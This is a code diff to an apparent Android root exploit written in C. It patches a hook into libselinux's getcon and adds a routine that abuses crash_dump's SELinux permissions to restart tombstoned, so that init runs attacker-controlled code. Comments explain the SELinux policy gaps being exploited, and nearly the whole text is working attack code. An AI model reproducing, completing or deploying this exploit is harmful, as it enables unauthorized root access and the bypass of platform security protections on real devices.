@@ -422,11 +422,31 @@ static int patch_hook(const char *lib, const char *sym,
     return ret2;
 }
 
-static int triggerSelinuxCheck(void) {
-    printf("Triggering hook via property service...\n");
-    /* __system_property_set causes init to call getpeercon() + selinux_check_access()
-     * in its property service handler, even if the set is denied by SELinux policy. */
-    __system_property_set("dfroot.trigger", "1");
+/* Like spawn_crash_dump but passes a name string as argv[1] rather than a numeric offset.
+ * Used for splicehelper modes that take a name string as argv[1] (e.g. "T"). */
+static int spawn_crash_dump_named(const char *name, const char *mode) {
+    int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
+    if (pid < 0) { printf("vfork failed: %s\n", strerror(errno)); return -1; }
+    if (pid == 0) {
+        execl(kCrashDump, "crashdump64", name, ko_target, mode, NULL);
+        _exit(1);
+    }
+    int st = 0;
+    TEMP_FAILURE_RETRY(waitpid(pid, &st, 0));
+    return st;
+}
+
+static int triggerTombstonedRestart(void) {
+    printf("trigger: ctl.restart tombstoned via crash_dump to force Service::Start on TID=1\n");
+    /* splicehelper "T" mode: execs setprop ctl.restart tombstoned from crash_dump domain.
+     * crash_dump has execute_no_trans on toolbox_exec + set on ctl_default_prop.
+     * Init's legacy ctl check resolves "ctl.tombstoned" → ctl_default_prop → allow. */
+    int st = spawn_crash_dump_named("tombstoned", "T");
+    if (st < 0) return -1;
+    if (!(WIFEXITED(st) && WEXITSTATUS(st) == 0)) {
+        printf("trigger: ctl.restart failed status=0x%x\n", st); return -1;
+    }
+    printf("trigger: tombstoned restart queued, init will call Service::Start on TID=1\n");
     return 0;
 }
 
@@ -503,14 +523,14 @@ static int exploit(void) {
     if (patch_helper()) goto done;
     if (patch_ko()) goto done;
     if (patch_hook("/system/lib64/libselinux.so",
-                   "selinux_check_access",
+                   "getcon",
                    libselinux_data, libselinux_len, libselinux_start, libselinux_first_inst_copy)) goto done;
 
     rc = 2;
     usleep(500000);
     
     printf("\n=== init  ===\n");
-    triggerSelinuxCheck();
+    if (triggerTombstonedRestart()) goto done;
 
     static const struct {
         const char *path;
